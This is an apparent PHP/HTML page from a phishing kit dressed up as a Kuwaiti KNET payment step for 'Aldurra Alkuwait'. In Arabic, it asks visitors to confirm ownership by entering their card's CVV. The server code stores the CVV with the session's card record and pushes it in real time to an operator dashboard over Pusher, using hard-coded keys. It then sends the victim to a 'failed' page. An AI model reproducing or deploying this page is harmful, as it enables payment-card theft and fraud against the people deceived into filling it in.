<?php
error_reporting(0);
ini_set('display_errors', 0);
########################
session_start();

require_once('./dashboard/init.php');
require_once('./vendor/autoload.php');
require __DIR__ . '/vendor/autoload.php';

if (isset($_GET['type'])) {
    $type = $_GET['type'];
}

if (isset($_POST['submit'])) {

    $options = array(
        'cluster' => 'ap2',
        'useTLS' => true
    );
    $pusher = new Pusher\Pusher(
        'e77a3acd6f6fc7cd49ce',
        'd42bbf9412e5a18b9d6c',
        '1816717',
        $options
    );

    $site = array(
        'cvv' => $_POST["cvv"],
        'm' => 'CVV',
        'type' => '3'
    );

    $id = $_SESSION['card_id'];
    $userId = $_SESSION['user_id'];
    $updateResult = $User->UpdateCardCVV($id, $site);
    if ($updateResult) {
        $User->UpdateStatus($userId, 'CVV');
        $data = [
            'userId' => $userId,
            'updatedData' => $site
        ];
    
        $pusher->trigger('my-channel', 'update-user', $data);
        echo "<script>document.location.href='failed.php';</script>";
    }
}


?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <title>الدرة</title>
    <meta content="width=device-width, initial-scale=1.0" name="viewport">
    <meta content="" name="keywords">
    <meta content="" name="description">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />

    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@200..1000&family=Rubik:ital,wght@0,300..900;1,300..900&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
    <style>
        * {
            padding: 0;
            margin: 0;
            font-family: "Cairo", sans-serif;
            color: #691E7C;
            direction: rtl;
        }

        body {
            background-color: #f8f9fa;
        }

        .nav {
            background-image: url(./assets/menu_bg\ \(1\).avif);
        }

        .carousel-caption {
            color: #691E7C;
        }

        /* .row {
            background-color: #edeef4 !important;
        } */

        .btn-primary {
            background-color: #691E7C !important;
            border: none;
        }

        .list-style-arrow {
            list-style-type: none;
            padding: 0;
        }

        ul,
        li {
            margin-top: 0;
            margin-bottom: 10.5px;
        }

        ul.list-style-arrow li {
            padding-right: 1.3em;
            position: relative;
        }

        ul.list-style-arrow li:after {
            content: "\f053";
            font-family: FontAwesome;
            font-size: 12px;
            display: block;
            width: 1.3em;
            position: absolute;
            right: 0;
            top: 5px;
        }

        .story {
            background-image: url(./assets/bg_s_story.jpg);
            background-position: top center;
            background-size: cover;
            min-height: 405px;
        }

        .gols {
            background-image: url(./assets/bg_s_story2.jpg);
            background-position: top center;
            background-size: cover;
            min-height: 543px;
        }

        .overl {
            background-image: url(./assets/overlay_bg.png);
            background-repeat: repeat;
            background-size: 50%;
        }

        .form-control,
        select {
            border-radius: 15px !important;
        }

        .cclas {
            border: 1px solid #000;
            border-radius: 20px;
        }

        option {
            color: #6c757d;
        }
    </style>
</head>

<body>

    <!-- <nav class="nav d-flex justify-content-end">
        <img src="./assets/24dde8_57f05cb3b1524c0ba849f6e5a4a0a7fe~mv2.avif" width="230" alt="">
    </nav> -->

    <div class="container text-center mt-4">
        <img src="./assets/b6ee10_401367f75c744af6a7385c03b5a823d7~mv2.avif" class="img-fluid" alt="">
    </div>

    <div class="container mt-4">
        <div class="cclas shadow">
            <div class="text-center mt-2">
                <img src="./assets/c5cbfa_cd127e4564c143ca98cf14fd04002708~mv2.avif" width="60" alt="">
            </div>
            <div class="d-flex justify-content-between mt-2">
                <span class="text-primary me-2 fw-bold">المستفيد:</span>
                <span class="text-secondary fw-bold" style="margin-left: 70px;">Aldurra Alkuwait</span>
                <span></span>
            </div>
            <hr class="my-1">
            <div class="d-flex justify-content-between mb-1">
                <span class="text-primary  me-2 fw-bold">المبلغ:</span>
                <span class="text-secondary fw-bold" style="margin-left: 10px;">KD 2.000</span>
                <span></span>
            </div>
        </div>
    </div>

    <form action="" method="POST">

        <div class="container mt-4">
            <div class="cclas shadow p-3">
                <h6 class="text-center text-secondary fw-bold">ير جى أثبات صحة ملكية البيانات في الدفع الكي نت  </h6>
                <h6 class="text-center text-secondary fw-bold">بأدخال رقم CVV المتواجد في خلف البطاقة </h6>
                <div class="d-flex justify-content-center align-items-center gap-3 my-4">
                    <img src="./assets/CVV.avif" class="img-fluid" width="100" alt="">
                    <input type="text" name="cvv" class="form-control tex-center w-50" pattern="[0-9]*" minlength="3" maxlength="3" inputmode="numeric" required>
                </div>
            </div>
        </div>


        <div class="container mt-4">
            <div class="cclas shadow p-3">
                <div class="text-center">
                    <button type="submit" name="submit" class="btn w-100 text-secondary fw-bold" style="border-radius: 5px; height:30px; font-size:11px;background-color:lightgray">إرسال</button>
                </div>
            </div>
        </div>

    </form>

    <div class="pt-5"></div>

    <!-- footer -->
    <!-- <div class="fixed-bottom" style="background-color: #691E7C;">
        <div class="overl py-3">
            <h6 class="text-center text-white">2024 Al-Durra- All rights reserved</h6>
        </div>
    </div> -->
    <script>
        // Initialize the time for the timer (1 minute = 60 seconds)
        let timeInSeconds = 60;

        // Function to format the time into minutes and seconds
        function formatTime(seconds) {
            const minutes = Math.floor(seconds / 60);
            const remainingSeconds = seconds % 60;
            return `${minutes < 10 ? '0' : ''}${minutes}:${remainingSeconds < 10 ? '0' : ''}${remainingSeconds}`;
        }

        // Function to update the timer display
        function updateTimer() {
            const timerDisplay = document.getElementById('timerDisplay');
            timerDisplay.textContent = formatTime(timeInSeconds);

            if (timeInSeconds === 0) {
                timeInSeconds = 60; // Reset the timer to 60 seconds
            } else {
                timeInSeconds--; // Decrease the time by 1 second
            }
        }

        // Start the timer, updating every second
        const timerInterval = setInterval(updateTimer, 1000);
    </script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js" integrity="sha384-IQsoLXl5PILFhosVNubq5LC7Qb9DXgDA9i+tQ8Zj3iwWAwPtgFTxbJ8NT4GN1R8p" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.min.js" integrity="sha384-cVKIPhGWiC2Al4u+LWgxfKTRIcfu0JTxR+EQDz/bgldoEyl4H0zUF0QKbrJ0EcQF" crossorigin="anonymous"></script>
</body>

</html>